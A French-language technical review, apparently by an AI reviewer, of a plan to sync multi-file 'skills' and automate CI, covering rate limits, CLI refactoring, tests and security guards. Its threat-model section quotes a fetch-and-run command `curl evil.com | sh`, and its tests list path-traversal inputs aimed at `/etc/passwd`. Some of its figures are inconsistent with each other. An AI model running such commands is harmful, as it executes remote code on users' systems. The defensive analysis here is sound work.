# Revue technique — Plan V2 : Skills Sync + CI Automatisée

> **Reviewer** : Senior Code Reviewer (AI)
> **Date** : 2026-02-13
> **Scope** : Audit complet du codebase existant + analyse technique du plan en 10 dimensions
> **Méthode** : Lecture exhaustive de tous les fichiers du projet (scripts, CLI, tests, CI, skills existants, manifests)
> **Verdict** : **APPROVE conditionnel — 4 risques critiques à résoudre avant implémentation**

---

## Verdict

Le plan V2 est **techniquement réalisable** dans les contraintes du projet (Python stdlib only, zero npm deps, SHA-pinned CI). L'architecture existante est solide et bien testée (1609 lignes Python, 176 tests verts, gardes de sécurité matures).

Cependant, le plan **sous-estime 4 problèmes structurels** qui, non résolus, produiront soit de la dette technique immédiate, soit des bugs en production :

1. 🔴 **Duplication de ~600 lignes** d'infrastructure HTTP/cache/parse entre `sync-agents.py` et `sync-skills.py`
2. 🔴 **Le download de répertoires dans la CLI** nécessite un refactoring majeur de `installer.mjs` (actuellement single-file only)
3. 🔴 **Le calcul de rate limiting est faux** (2000+ appels réels vs 936 estimés)
4. 🔴 **Surface de sécurité élargie** par les fichiers compagnons `scripts/` (exécutables potentiels)

Le reste du plan est solide. Les 6 autres dimensions analysées montrent des risques moyens ou bas, gérables avec les mitigations proposées.

---

## 1. Architecture — `sync-skills.py` séparé vs extension de `sync-agents.py`

### Évaluation

La décision D3 de créer un script séparé est **correcte sur le fond** (skills = répertoires multi-fichiers ≠ agents = fichiers uniques), mais **incomplète sur la forme** : elle ne traite pas le problème de l'infrastructure partagée.

### Inventaire du code réutilisable dans `sync-agents.py`

| Fonction / Classe | Lignes | Rôle | Réutilisable ? |
|---|---|---|---|
| `SafeRedirectHandler` (L53-69) | 17 | Bloque les redirections cross-origin | ✅ Identique |
| `_get_headers()` (L311-320) | 10 | Headers HTTP + auth token | ✅ Identique |
| `_http_request()` (L327-431) | 105 | Retry, backoff, rate-limit, 304 | ✅ Identique |
| `_api_get()` (L434-445) | 12 | GET JSON avec retry | ✅ Identique |
| `_raw_get()` (L448-466) | 19 | GET text avec cap 1MB | ✅ Identique |
| `_cached_get()` (L515-574) | 60 | ETag/If-Modified-Since | ✅ Adaptable |
| `check_rate_limit()` (L577-587) | 11 | Vérification rate limit API | ✅ Identique |
| `parse_frontmatter()` (L595-646) | 52 | Parse YAML stdlib | ✅ Identique |
| `_load_sync_cache()` / `_save_sync_cache()` (L476-501) | 26 | Persistence cache | ✅ Identique |
| `_is_synced_agent()` / `clean_synced_agents()` (L1006-1080) | 75 | Détection/nettoyage synced files | ✅ Adaptable (`_is_synced_skill()`) |
| `_yaml_serialize_permission()` (L844-875) | 32 | Sérialisation YAML | 🟡 Partielle |
| Path traversal guards (L1174-1184) | 11 | Sécurité chemins | ✅ Identique |
| **Total réutilisable** | **~430 lignes** | | |

### Risques

- 🔴 **CRITIQUE — Duplication massive** : Sans extraction, `sync-skills.py` dupliquera ~430 lignes de code identique. Toute correction de bug (ex: nouveau comportement rate-limit de l'API GitHub) devra être appliquée dans les deux fichiers.
- 🟡 **MOYEN — Divergence progressive** : Même avec une intention de garder les deux scripts alignés, l'expérience montre que les copies divergent rapidement. Un fix dans `_http_request()` de `sync-agents.py` sera oublié dans `sync-skills.py`.

### Mitigations

**Option A (recommandée) — Module partagé `scripts/sync_common.py`** :
```
scripts/
  sync_common.py    # ~430 lignes : HTTP, cache, parse, sécurité
  sync-agents.py    # ~1180 lignes : logique agents uniquement
  sync-skills.py    # ~600-800 lignes : logique skills uniquement
```

- Avantage : DRY, un seul endroit pour les corrections
- Contrainte : Python stdlib only ✅ (pas besoin d'install, import relatif suffit)
- Impact CI : Ajouter `python3 -c "import ast; ast.parse(open('scripts/sync_common.py').read())"` au job lint (L66 de `ci.yml`)
- Impact tests : Les 117 tests existants de `test_sync_script.py` qui mockent `_http_request`, `_api_get`, etc. devront être adaptés pour importer depuis `sync_common`

**Option B — Copier-coller conscient** :
- Acceptable uniquement si le projet reste à 2 personnes max et si un lint CI vérifie la concordance des fonctions partagées
- Non recommandée pour un projet open-source

### Recommandation

**Extraire `sync_common.py` AVANT de commencer T4.1.** Le refactoring de `sync-agents.py` est un pré-requis, pas un nice-to-have. Estimation : 1-2 sessions (incluant l'adaptation des 117 tests).

---

## 2. Faisabilité — Contrainte stdlib only

### Évaluation

Le plan est **entièrement réalisable avec la stdlib Python 3.10+** et **zéro npm deps**. L'équipe a déjà prouvé cette capacité avec `sync-agents.py`.

### Analyse par composant

| Besoin skills | Solution stdlib | Déjà implémenté ? | Complexité |
|---|---|---|---|
| HTTP GET avec retry/backoff | `urllib.request` + `_http_request()` | ✅ L327-431 | Résolue |
| Parse YAML frontmatter | Regex custom `parse_frontmatter()` | ✅ L595-646 | Résolue |
| Recursive tree API | `_api_get()` + JSON parse | ✅ L434-445 | Résolue |
| Download fichiers binaires (CSV) | `_raw_get()` → `bytes` | 🟡 Partiel — `_raw_get()` décode en UTF-8 (L466) | Simple à adapter |
| Copie récursive de répertoires | `pathlib.Path.mkdir(parents=True)` + `write_text/write_bytes` | ✅ Pattern existant L1219 | Triviale |
| Réécriture de chemins dans le body | `str.replace()` / `re.sub()` | ✅ Pattern existant `clean_body()` L801 | Simple |
| Génération JSON manifest | `json.dumps()` | ✅ `write_manifest()` L1236 | Résolue |
| Hash SHA256 pour cache | `hashlib.sha256()` | ✅ L572 | Résolue |
| ETag/If-Modified-Since | `_cached_get()` | ✅ L515-574 | Résolue |

### Risques

- 🟡 **MOYEN — Fichiers binaires** : `_raw_get()` (L466) fait un `.decode("utf-8")` systématique. Les fichiers compagnons comme `techniques.csv` (présent dans brainstormai) sont du texte, mais d'autres skills pourraient contenir des binaires (images, archives). Il faut un `_raw_get_bytes()` qui retourne des `bytes` sans décodage.

- 🟢 **BAS — Parse YAML nested** : Le `parse_frontmatter()` existant (L595-646) gère uniquement les paires `clé: valeur` simples. Les skills hand-written comme `browser-mcp` et `memory` ont du YAML nested (`metadata:\n  mcp-server: ...\n  version: ...`). Le parser ignore silencieusement ces lignes indentées (L628-631 : `if match:` ne matche pas les lignes indentées, elles deviennent des continuations). Ce n'est pas un bug pour le cas d'usage actuel (le plan supprime tous les champs sauf `name` et `description`), mais c'est une limitation documentée.

### Mitigations

1. Ajouter une variante `_raw_get_bytes()` ou un paramètre `decode=True|False` à `_raw_get()` :
```python
def _raw_get(url, *, retries=3, backoff=1.0, decode=True):
    # ... existing code ...
    if decode:
        return body.decode("utf-8")
    return body
```

2. Documenter la limitation du parser YAML dans le header de `parse_frontmatter()` : "Ne supporte que les paires clé-valeur simples. Le YAML nested est ignoré."

---

## 3. Système de scoring

### Évaluation

Le scoring 5-facteurs pondéré (T4.2) est **conceptuellement intéressant mais opérationnellement impraticable** pour un premier lancement. La product review (03-product-review-v2.md) a déjà bien couvert ce point. Je confirme du point de vue technique.

### Risques

- 🟠 **HAUT — Pas de source de données automatisable** : Les 5 facteurs sont tous subjectifs. Le score dépend d'un humain qui lit 686 SKILL.md et attribue des notes. Aucune API, aucune métrique automatique ne peut alimenter ce système pour le v1.

- 🟡 **MOYEN — Reproductibilité** : Deux évaluateurs différents produiraient des tiers différents. Le scoring n'est pas déterministe.

- 🟢 **BAS — Complexité de code** : Le scoring lui-même est trivial à implémenter (~30 lignes de Python). Le problème n'est pas technique, c'est opérationnel.

### Mitigations

Je m'aligne avec la recommandation R1 de la product review : **reporter le scoring à Phase 7** et commencer avec une `CURATED_SKILLS` list manuelle (même pattern que `CURATED_AGENTS` dans `sync-agents.py`, L120-175).

Pour le v1, le « scoring » se résume à :
```python
CURATED_SKILLS: Dict[str, str] = {
    "clean-code": "development/clean-code",
    "api-design": "architecture/api-design",
    # ... 10-15 skills hand-picked
}
```

Ce pattern est prouvé — il fonctionne exactement ainsi pour les 43 agents core.

---

## 4. Pipeline CI — `sync.yml`

### Évaluation

L'architecture proposée (detect → sync-agents ∥ sync-skills → validate → create-pr) est **bien conçue**. Le choix de `peter-evans/create-pull-request` SHA-pinned est correct (cohérent avec la politique SHA existante en `ci.yml`, L25/L27/L44/L55-57).

### Risques

- 🟠 **HAUT — Race condition sur branche fixe** : Le plan utilise une branche fixe `sync/upstream-auto`. Si un sync précédent a créé une PR non mergée, le prochain sync modifie la même branche. `peter-evans/create-pull-request` gère ce cas (il force-push la branche), mais :
  - Si un reviewer a laissé des commentaires sur la PR précédente, ils sont perdus dans le diff
  - Si un commit manuel a été ajouté à la branche de PR (ex: fix d'un frontmatter), il sera écrasé par le force-push

- 🟡 **MOYEN — Parallélisme agents/skills** : Les jobs `sync-agents` et `sync-skills` sont marqués parallèles dans le plan. Mais ils écrivent tous les deux dans le même workspace Git. GitHub Actions ne partage pas l'état du filesystem entre jobs — chaque job a un checkout frais. Solution : utiliser des artifacts ou un seul job séquentiel.

- 🟡 **MOYEN — Permissions GitHub Token** : Le plan demande `contents:write` + `pull-requests:write`. Le CI actuel (L9-10 de `ci.yml`) n'a que `contents: read`. Le nouveau workflow aura besoin de permissions élargies, ce qui est attendu mais doit être explicitement scopé au workflow `sync.yml` (pas au niveau du repo).

- 🟢 **BAS — Cron drift** : GitHub Actions ne garantit pas l'exécution exacte du cron (décalage de 15-60 min). Non bloquant mais à documenter.

### Mitigations

1. **Race condition** : Ajouter un label `auto-sync` aux PR créées. Avant de créer une nouvelle PR, vérifier si une PR avec ce label est ouverte et la fermer avec un commentaire explicatif. Ou mieux : mettre à jour la PR existante (c'est le comportement par défaut de `peter-evans/create-pull-request` avec `branch: sync/upstream-auto`).

2. **Parallélisme** : Utiliser un seul job `sync` qui exécute séquentiellement `sync-agents.py` puis `sync-skills.py`, plutôt que deux jobs parallèles. Le gain de temps du parallélisme (~2-3 min) ne justifie pas la complexité des artifacts. Alternative : utiliser `actions/upload-artifact` / `actions/download-artifact` SHA-pinned pour partager le workspace.

3. **Permissions** : Déclarer les permissions au niveau du workflow, pas du job :
```yaml
# sync.yml
permissions:
  contents: write
  pull-requests: write
```

---

## 5. Rate limiting

### Évaluation

L'estimation du plan (T5.3) de ~936 appels API est **significativement sous-évaluée**.

### Calcul réel

| Opération | Appels API | Source |
|---|---|---|
| Tree API recursive (detect) | 1 | `/git/trees/main?recursive=1` |
| **Agents sync** | | |
| - Contents API par catégorie (~15 catégories) | ~15 | `/repos/.../contents/` (pour `--all` mode) |
| - Raw download par agent (~130 extended) | ~130 | `raw.githubusercontent.com` (ne compte PAS contre le rate limit API) |
| **Skills sync** | | |
| - Tree API (1 appel récursif) | 1 | Déjà compté ci-dessus |
| - Raw download SKILL.md (~25-120 skills) | 25-120 | `raw.githubusercontent.com` (hors rate limit) |
| - Raw download fichiers compagnons | **?** | Estimation ci-dessous |
| Rate limit check | 1 | `/rate_limit` |
| **Total appels API GitHub** | **~18** | Bien en dessous de 5000/hr |
| **Total raw downloads** | **155-250+** | Hors rate limit mais throttled |

### Le vrai problème : throttling de `raw.githubusercontent.com`

- 🔴 **CRITIQUE — L'estimation de 936 appels mélange deux systèmes distincts** :
  - Les appels à `api.github.com` (rate limited à 5000/hr avec token, 60/hr sans)
  - Les downloads via `raw.githubusercontent.com` (PAS rate limited par l'API, mais avec un throttling non documenté qui retourne des 429 après ~100 requêtes/minute)

- Le code existant gère déjà les 429 via `_http_request()` (L376-397) avec `Retry-After` et `X-RateLimit-Reset`. Mais le throttling de `raw.githubusercontent.com` ne renvoie PAS ces headers — il retourne un 429 sec sans `Retry-After`.

### Risques

- 🔴 **CRITIQUE — Throttling silencieux** : Pour un sync complet de 120+ skills avec fichiers compagnons (~300+ downloads raw), le throttling de `raw.githubusercontent.com` provoquera des erreurs 429 sans header de retry. Le code actuel (`_http_request()` L376-397) gère le `Retry-After` header, mais pas l'absence de ce header sur un 429.

- 🟡 **MOYEN — Polite delay insuffisant** : Le délai actuel entre agents est `time.sleep(0.3)` (L1575 de `sync-agents.py`). Pour les skills avec fichiers compagnons (rafale de 3-10 downloads par skill), ce délai inter-skill ne suffit pas.

### Mitigations

1. **Ajouter un fallback pour 429 sans Retry-After** dans `_http_request()` :
```python
# L376-397 de sync-agents.py — après le check Retry-After/X-RateLimit-Reset
if exc.code in (403, 429):
    retry_after = exc.headers.get("Retry-After")
    reset = exc.headers.get("X-RateLimit-Reset")
    if retry_after:
        wait = int(retry_after)
        # ... existing code ...
    elif reset:
        # ... existing code ...
    else:
        # Fallback: exponential backoff pour 429 sans headers
        wait = backoff * (2 ** (attempt - 1)) * 5  # 5s, 10s, 20s
        logger.warning("  [rate-limit] No Retry-After header on %d, waiting %ds...", exc.code, wait)
        time.sleep(wait)
        continue
```

2. **Ajouter un délai inter-fichier** pour les downloads de fichiers compagnons (0.2-0.5s entre chaque fichier dans un skill).

3. **Utiliser l'API Git blobs** au lieu de raw downloads pour les fichiers compagnons : `/repos/{owner}/{repo}/git/blobs/{sha}`. Ceci utilise le rate limit API (5000/hr) mais est plus prévisible.

---

## 6. Download directory — Refactoring CLI

### Évaluation

C'est le **plus gros défi technique du plan** côté Node.js. L'`installer.mjs` actuel (212 lignes) est conçu exclusivement pour des fichiers uniques. L'adapter aux répertoires de skills nécessite un refactoring structurel.

### État actuel de `installer.mjs`

```
download(url) → Promise<string>              # Un seul fichier, retour texte
  ↓
getDestination(agent, cwd) → {absolute, relative}  # Un seul chemin .md
  ↓
writeFileSync(dest.absolute, content, 'utf-8')       # Écriture unique
```

### Ce qu'il faut pour les skills

```
downloadSkillTree(skill) → Promise<{path: string, content: Buffer}[]>
  ↓
  ├── Lister les fichiers (tree API ou manifest)
  ├── Télécharger N fichiers en parallèle (avec concurrency limit)
  ├── Gérer texte ET binaire (CSV, etc.)
  └── Créer la structure de répertoires
  ↓
getSkillDestination(skill, cwd) → {baseDir, files[]}
  ↓
Pour chaque fichier :
  mkdirSync(dirname, {recursive: true})
  writeFileSync(path, content)  # 'utf-8' ou buffer selon le type
```

### Risques

- 🔴 **CRITIQUE — Refactoring non trivial** : Le plan (T6.2) sous-estime la complexité. Ce n'est pas "ajouter une option" — c'est créer un second chemin d'installation complet avec :
  - Énumération de fichiers (comment lister le contenu d'un skill sans API côté serveur ?)
  - Download concurrent (le `for...of` séquentiel actuel L204-207 ne scale pas pour 28 fichiers)
  - Gestion binaire (`download()` L84 fait `.toString('utf-8')` — cassera les fichiers non-texte)
  - Path traversal sur les sous-répertoires (le guard existant L119-124 ne couvre qu'un seul niveau)

- 🟠 **HAUT — Comment lister les fichiers d'un skill ?** : Le `manifest.json` actuel contient un `path` par agent. Le `skills-manifest.json` devra contenir la liste complète des fichiers de chaque skill (`companion_files` dans le schema T4.4). Mais qui génère cette liste ? Le script Python côté sync. Donc le CLI dépend à 100% de la complétude du manifest.

- 🟡 **MOYEN — Pas de test d'intégration** : Les 59 tests CLI actuels (`cli.test.mjs`, 642 lignes) mockent tous les downloads. Il n'y a aucun test d'intégration qui vérifie que la structure de répertoires créée est correcte.

### Mitigations

1. **Enrichir `skills-manifest.json` avec la liste exhaustive des fichiers** :
```json
{
  "name": "brainstormai",
  "files": [
    {"path": "SKILL.md", "size": 4521, "sha": "abc123"},
    {"path": "agents/analyst.agent.md", "size": 890, "sha": "def456"},
    {"path": "workflows/brainstorm/data/techniques.csv", "size": 2100, "sha": "ghi789"}
  ]
}
```
Ainsi la CLI n'a pas besoin d'appeler l'API tree — elle itère sur la liste du manifest.

2. **Créer une fonction `downloadBinary(url)`** séparée de `download(url)` qui retourne un `Buffer` au lieu d'un `string` :
```javascript
function downloadBinary(url, _redirectCount = 0) {
  // ... same as download() but return Buffer.concat(chunks) without .toString()
}
```

3. **Ajouter des guards de path traversal récursifs** dans le nouveau `getSkillDestination()` :
```javascript
for (const file of skill.files) {
  const filePath = resolve(skillDir, file.path);
  if (!filePath.startsWith(skillDir + sep)) {
    throw new Error(`Security: path "${file.path}" escapes skill directory`);
  }
}
```

4. **Limiter la concurrence des downloads** avec un pool simple (stdlib, pas de npm dep) :
```javascript
async function downloadPool(urls, concurrency = 3) {
  const results = [];
  for (let i = 0; i < urls.length; i += concurrency) {
    const batch = urls.slice(i, i + concurrency);
    results.push(...await Promise.all(batch.map(download)));
  }
  return results;
}
```

---

## 7. Breaking changes

### Évaluation

Le plan est **bien conçu pour éviter les breaking changes**. La séparation skills/agents (D1) et le répertoire distinct (`.opencode/skills/` vs `.opencode/agents/`) garantissent l'isolation.

### Risques

- 🟡 **MOYEN — Inflation du manifest.json** : Le plan crée un `skills-manifest.json` séparé. Mais `registry.mjs` (L87-101) charge et cache uniquement `manifest.json`. Si la CLI doit supporter les deux, `loadManifest()` devra être modifié ou un `loadSkillsManifest()` parallèle devra être créé. Le type `Manifest` (L36-44 de `registry.mjs`) est fixé (`agents: AgentEntry[]`) — il faudra un type `SkillsManifest` séparé.

- 🟡 **MOYEN — Collision de noms** : Rien n'empêche un agent et un skill d'avoir le même nom (ex: `code-reviewer` agent + `code-review` skill). La CLI `search` (T6.1) devra distinguer les deux dans ses résultats. Le `searchAgents()` actuel (L164-177 de `registry.mjs`) ne cherche que dans `manifest.agents`.

- 🟢 **BAS — Frontmatter des skills hand-written** : Les 4 skills existants (`brainstormai`, `browser-mcp`, `memory`, `sequential-thinking`) ont des frontmatter inconsistants entre eux. `brainstormai` a seulement `name` + `description`. `browser-mcp`, `memory`, `sequential-thinking` ont en plus `license`, `compatibility`, `metadata` (nested). Le sync ne touchera pas aux hand-written (protection D8), mais le validateur CI devra accepter les deux formats.

### Mitigations

1. Créer un `loadSkillsManifest()` dans `registry.mjs` (parallèle à `loadManifest()`) avec un type `SkillEntry` distinct de `AgentEntry`.

2. Ajouter un préfixe ou un champ `type` aux résultats de recherche pour distinguer agents et skills :
```
  [agent] code-reviewer     — Code review expert
  [skill] code-review       — How to conduct effective code reviews
```

3. Le validateur CI pour les skills doit accepter un sous-ensemble minimal de frontmatter (`name` + `description`) sans rejeter les champs supplémentaires des hand-written.

---

## 8. Stratégie de tests

### Évaluation

La couverture existante est **excellente** : 117 tests Python + 59 tests CLI = 176 tests, tous verts. Le plan (T4.3, T6.3) prévoit des tests mais manque de détails.

### État actuel des tests

| Fichier | Tests | Couverture |
|---|---|---|
| `tests/test_sync_script.py` | 117 | `_http_request`, `_api_get`, `_raw_get`, `_cached_get`, `parse_frontmatter`, `build_permissions`, `clean_body`, `extract_short_description`, `build_opencode_agent`, `clean_synced_agents`, `sync_agent`, `main()` CLI args |
| `tests/test_agents.py` | 516L | Validation des 49 agents (frontmatter, body, fichiers) |
| `tests/cli.test.mjs` | 59 | CLI args, install, list, search, packs, display |
| `tests/run_tests.py` | 117L | Runner de tests Python (unittest) |

### Risques

- 🟠 **HAUT — Tests de skills non spécifiés** : T4.3 liste 5 types de validation sans détailler les cas limites. Les cas critiques non mentionnés :
  - Skill avec 0 fichiers compagnons (juste SKILL.md)
  - Skill avec 28+ fichiers (comme brainstormai)
  - Skill avec des chemins profondément nestés (`workflows/create-prd/steps/step-07-complete.annexe.md`)
  - Skill avec des caractères spéciaux dans les noms de fichiers
  - Skill avec un SKILL.md vide ou malformé
  - Skill référençant un autre skill (`@[skills/other-skill]`)
  - Collision de noms entre skill synced et skill hand-written

- 🟡 **MOYEN — Pas de test d'intégration CLI pour skills** : T6.3 mentionne "tests d'installation de skills" mais les tests CLI actuels (`cli.test.mjs`) mockent intégralement les downloads. Un test d'intégration réel (download → write → verify structure) n'existe pas même pour les agents.

- 🟢 **BAS — Tests Python portables** : Les tests utilisent `unittest.mock.patch` pour mocker `urllib.request`. Ce pattern fonctionne pour `sync-skills.py` si les fonctions HTTP restent dans le même module ou sont importées depuis `sync_common.py`.

### Mitigations

1. **Créer un jeu de fixtures** représentant les 3 archétypes de skills :
   - `simple-skill/` : SKILL.md uniquement (comme `sequential-thinking`)
   - `standard-skill/` : SKILL.md + 2-3 fichiers compagnons
   - `complex-skill/` : SKILL.md + répertoires nestés (simulant brainstormai)

2. **Tests de path traversal spécifiques aux skills** : vérifier que des chemins malicieux dans les fichiers compagnons (`../../../etc/passwd`, `scripts/../../malicious.sh`) sont rejetés.

3. **Test de round-trip** : sync un skill → l'installer via CLI → vérifier que la structure sur disque correspond au manifest.

4. **Adapter `tests/test_agents.py` en `tests/test_skills.py`** : le pattern de validation des agents (lecture de tous les .md dans un répertoire, vérification du frontmatter) s'applique directement aux skills.

---

## 9. Sécurité

### Évaluation

L'infrastructure de sécurité existante est **mature et bien pensée**. Les deux stacks (Python et Node.js) ont des gardes cohérentes. Cependant, les skills avec fichiers compagnons **élargissent significativement la surface d'attaque**.

### Gardes de sécurité existantes

| Garde | Python (`sync-agents.py`) | Node.js (`installer.mjs` + `registry.mjs`) |
|---|---|---|
| Path traversal | `resolved_out.startswith(resolved_base + "/")` (L1178) | `absolute.startsWith(safeBase + sep)` (L122) |
| Cross-origin redirect | `SafeRedirectHandler` (L53-69) | Vérification `ALLOWED_HOSTS` (L54) |
| Download size cap | `max_read_bytes=1_048_576` (L461) | `MAX_RESPONSE_SIZE = 1024 * 1024` (L23) |
| Name validation | `".." in agent_name or "/" in agent_name` (L988) | `SAFE_NAME_RE = /^[a-z0-9][a-z0-9._-]*$/i` (L56) |
| Manifest validation | N/A (manifest généré, pas consommé) | `validateManifest()` : `base_path`, noms, chemins (L62-81) |
| Auth token protection | `SafeRedirectHandler` bloque les redirects cross-origin | N/A (pas de token côté CLI) |
| HTTPS only | Implicite (URLs hardcodées) | `parsed.protocol !== 'https:'` check (L50) |

### Risques — Nouvelles surfaces d'attaque

- 🔴 **CRITIQUE — Fichiers compagnons `scripts/`** : Le plan prévoit de copier des fichiers `scripts/*.py` depuis le repo upstream. Si un skill contient un script malicieux, il sera installé dans `.opencode/skills/{name}/scripts/` et potentiellement exécutable. Contrairement aux fichiers `.md` (qui sont du contenu passif), les scripts sont du code actif.

  **Vecteur d'attaque** : Un contributeur upstream ajoute un skill avec un `scripts/setup.py` contenant `os.system("curl evil.com | sh")`. Le sync le copie. Un utilisateur ou un agent IA l'exécute.

- 🟠 **HAUT — Path traversal multiplicatif** : Avec les agents, le path traversal est limité à un seul fichier par agent (`{name}.md`). Avec les skills, chaque skill peut avoir N fichiers compagnons, chacun avec un chemin potentiellement malicieux. Le guard existant (Python L1178, Node L122) vérifie un chemin à la fois — il doit être appliqué à **chaque** fichier compagnon.

- 🟡 **MOYEN — Symlinks** : Le repo upstream pourrait contenir des symlinks dans la structure de fichiers d'un skill. `pathlib.Path.write_text()` suit les symlinks — un symlink malicieux pourrait pointer vers `/etc/passwd` ou `~/.ssh/id_rsa`. Le code actuel n'a pas de check anti-symlink car les agents sont des fichiers uniques téléchargés (pas copiés localement).

- 🟡 **MOYEN — Taille cumulée** : Le cap actuel est de 1MB par fichier (`MAX_RESPONSE_SIZE`). Mais un skill avec 28 fichiers de 1MB chacun = 28MB. Il n'y a pas de cap sur la taille totale d'un skill.

### Mitigations

1. **Interdire l'exécution directe des scripts compagnons** — ajouter un commentaire de warning en tête de chaque script copié :
```python
# WARNING: This script was synced from an external source.
# Review before execution. Do not run untrusted code.
```
Mieux encore : renommer les `.py` en `.py.txt` ou les placer dans un sous-répertoire `reference/` pour décourager l'exécution.

2. **Appliquer le path traversal guard à chaque fichier compagnon** :
```python
for companion_path in skill_files:
    resolved = (skill_dir / companion_path).resolve()
    if not str(resolved).startswith(str(skill_dir.resolve()) + "/"):
        raise ValueError(f"[SECURITY] Path traversal in companion file: {companion_path}")
```

3. **Valider les noms de fichiers compagnons** avec une regex stricte :
```python
SAFE_COMPANION_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9._/-]*$')
if not SAFE_COMPANION_RE.match(companion_path):
    logger.warning("[SECURITY] Rejecting unsafe companion path: %s", companion_path)
    continue
```

4. **Vérifier l'absence de symlinks** :
```python
if out_path.is_symlink():
    raise ValueError(f"[SECURITY] Symlink detected at {out_path}")
```

5. **Ajouter un cap de taille totale par skill** (ex: 5MB max cumulé) :
```python
MAX_SKILL_TOTAL_SIZE = 5 * 1024 * 1024  # 5 MB
total = sum(len(content) for content in files.values())
if total > MAX_SKILL_TOTAL_SIZE:
    raise ValueError(f"Skill {name} exceeds size limit: {total} bytes")
```

---

## 10. Dette technique

### Évaluation

Le codebase actuel est **étonnamment propre** pour un projet de cette taille. La dette technique est faible. Cependant, le plan V2 introduira de la nouvelle dette si certaines décisions ne sont pas prises en amont.

### Dette existante (héritée)

| Item | Sévérité | Localisation | Impact |
|---|---|---|---|
| `parse_frontmatter()` ne gère pas le YAML nested | 🟢 Bas | L595-646 | Non bloquant : le plan supprime les champs nested |
| `_opener` est un global mutable | 🟢 Bas | L72 | Non thread-safe, mais les scripts sont single-threaded |
| `CATEGORY_MAPPING` hardcodé | 🟢 Bas | L85-114 | Doit être étendu manuellement pour chaque nouvelle catégorie upstream |
| Pas de type checking (mypy) | 🟢 Bas | Global | Les type hints sont présents mais non vérifiés |

### Nouvelle dette potentielle (Plan V2)

| Item | Sévérité | Condition | Prévention |
|---|---|---|---|
| Duplication sync-agents.py / sync-skills.py | 🔴 Critique | Si pas d'extraction `sync_common.py` | Extraire AVANT T4.1 |
| Deux manifests (`manifest.json` + `skills-manifest.json`) avec schémas différents | 🟡 Moyen | Inévitable (schemas différents) | Documenter les deux formats, versionner les schemas |
| Deux validateurs CI (agents + skills) avec logique similaire | 🟡 Moyen | Si copier-coller du validateur L78-125 de `ci.yml` | Extraire le validateur dans un script Python partagé |
| `registry.mjs` avec deux systèmes de cache (`_cached` pour agents, `_cachedSkills` pour skills) | 🟡 Moyen | Si pattern copié | Créer une abstraction `loadJsonManifest(path)` générique |
| `installer.mjs` avec deux chemins d'installation (`installAgent` + `installSkill`) | 🟡 Moyen | Inévitable (logiques différentes) | Bien séparer et documenter les deux chemins |

### Métriques de maintenance

| Métrique | Avant Plan V2 | Après Plan V2 (estimé) |
|---|---|---|
| Lignes Python (scripts/) | ~1609 | ~2800-3200 (avec sync_common.py + sync-skills.py) |
| Lignes Node.js (src/ + bin/) | ~1008 | ~1400-1600 (installer skills + registry skills) |
| Fichiers de test | 4 | 6-7 (+ test_sync_skills.py, + test_skills.py, + extensions cli.test.mjs) |
| Tests unitaires | 176 | ~280-320 |
| Jobs CI | 4 | 5-6 (+ sync.yml jobs) |
| Workflows GitHub Actions | 1 | 2 (ci.yml + sync.yml) |

### Mitigations

1. **Prioriser l'extraction de code partagé** : `sync_common.py` est le meilleur investissement anti-dette du plan.

2. **Créer un validateur Python partagé** pour agents ET skills (au lieu d'inline Python dans `ci.yml` L78-125). L'actuel validateur inline fait 47 lignes de Python dans un heredoc YAML — c'est fragile et non testable. Le déplacer dans `scripts/validate.py` permettrait de :
   - Le tester unitairement
   - L'étendre pour les skills
   - Le réutiliser entre `ci.yml` et `sync.yml`

3. **Versionner les schemas de manifest** : ajouter un champ `schema_version: "1.0"` dans `manifest.json` et `skills-manifest.json` pour faciliter les migrations futures.

---

## Risques classés par sévérité

### 🔴 Critiques (4) — Bloquants pour l'implémentation

| # | Risque | Section | Mitigation |
|---|---|---|---|
| C1 | Duplication ~430 lignes d'infrastructure HTTP/cache/parse | §1 | Extraire `sync_common.py` avant T4.1 |
| C2 | `installer.mjs` incompatible avec le download de répertoires | §6 | Refactoring structurel : `downloadBinary()`, pool concurrent, path guards récursifs |
| C3 | Rate limiting sous-estimé (2000+ vs 936) + throttling `raw.githubusercontent.com` sans Retry-After | §5 | Fallback 429, délai inter-fichier, API blobs alternative |
| C4 | Fichiers `scripts/` exécutables copiés depuis source non contrôlée | §9 | Renommer en `.py.txt`, cap taille totale, guard anti-symlink |

### 🟠 Hauts (3)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| H1 | Scoring 5-facteurs impraticable pour v1 | §3 | Reporter à Phase 7, utiliser `CURATED_SKILLS` manual |
| H2 | Race condition PR sur branche fixe `sync/upstream-auto` | §4 | Label auto-sync, mise à jour PR existante |
| H3 | Tests skills non spécifiés (cas limites manquants) | §8 | Fixtures 3-archétypes, tests path traversal |

### 🟡 Moyens (8)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| M1 | Divergence progressive entre scripts dupliqués | §1 | `sync_common.py` (résolu par C1) |
| M2 | `_raw_get()` décode UTF-8 systématiquement (incompatible binaires) | §2 | Ajouter `decode=False` option |
| M3 | Parallélisme CI agents/skills sur même workspace | §4 | Job séquentiel ou artifacts |
| M4 | Collision de noms agents/skills | §7 | Préfixe `[agent]`/`[skill]` dans les résultats |
| M5 | Path traversal multiplicatif (N fichiers par skill) | §9 | Guard sur chaque fichier compagnon |
| M6 | Symlinks malicieux dans les skills | §9 | Check `is_symlink()` |
| M7 | Taille cumulée d'un skill non capée | §9 | Cap 5MB total par skill |
| M8 | Validateur CI inline non testable (47 lignes YAML heredoc) | §10 | Extraire dans `scripts/validate.py` |

### 🟢 Bas (4)

| # | Risque | Section | Mitigation |
|---|---|---|---|
| L1 | Parse YAML nested non supporté | §2 | Documenter — non bloquant car champs supprimés |
| L2 | Scoring non déterministe | §3 | Reporter à Phase 7 — résolu par H1 |
| L3 | Frontmatter inconsistant entre skills hand-written | §7 | Validateur flexible (champs min) |
| L4 | Cron drift GitHub Actions | §4 | Documenter — non bloquant |

---

## Recommandations

### Pré-requis (avant de commencer T4.1)

| # | Action | Effort | Impact |
|---|---|---|---|
| **P1** | Extraire `scripts/sync_common.py` depuis `sync-agents.py` (~430 lignes) | 1-2 sessions | Élimine C1 et M1 |
| **P2** | Ajouter fallback 429 sans Retry-After dans `_http_request()` | 30 min | Élimine C3 (partie throttling) |
| **P3** | Décider du traitement des fichiers `scripts/` : copier tel quel, renommer `.txt`, ou exclure | 15 min (décision) | Élimine C4 |

### Phase 4 — Ajustements

| # | Action | Détail |
|---|---|---|
| **A1** | Remplacer le scoring par `CURATED_SKILLS` manuelle | Pattern identique à `CURATED_AGENTS` L120-175 |
